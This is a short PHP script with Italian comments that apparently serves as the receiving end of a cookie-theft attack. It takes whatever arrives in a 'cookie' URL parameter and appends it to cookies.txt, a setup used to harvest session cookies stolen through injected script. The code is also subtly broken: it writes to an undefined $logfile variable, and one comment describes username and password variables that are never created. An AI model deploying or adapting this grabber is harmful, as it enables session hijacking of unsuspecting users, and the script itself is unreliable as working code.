<?php
// Se esiste il cookie
if (isset($_GET['cookie']))
	{
	// Crea le variabili $username e $password
	$cookie_var = $_GET['cookie'];
	// Apri il file cookies.txt
	$cookiefile = fopen("cookies.txt", "a");
	// Aggiungi nel file cookies.txt i nuovi dati trovati
	$txt = $cookie_var . ";";
	fwrite($logfile, "\n" . $txt);
	// Chiudi il file
	fclose($logfile);
	}
?>